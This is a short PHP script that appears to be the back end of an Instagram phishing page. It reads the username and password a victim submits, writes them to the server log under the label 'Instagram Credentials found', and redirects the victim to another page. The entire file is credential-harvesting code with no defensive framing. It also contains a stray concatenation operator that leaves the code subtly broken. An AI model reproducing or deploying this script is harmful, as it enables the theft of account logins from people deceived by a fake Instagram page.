<?php
error_log("-----------------------------------------------------------------------");
error_log("Instagram Credentials found");
error_log("[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] .);
error_log("-----------------------------------------------------------------------");
header('Location:/index3.html');
exit();

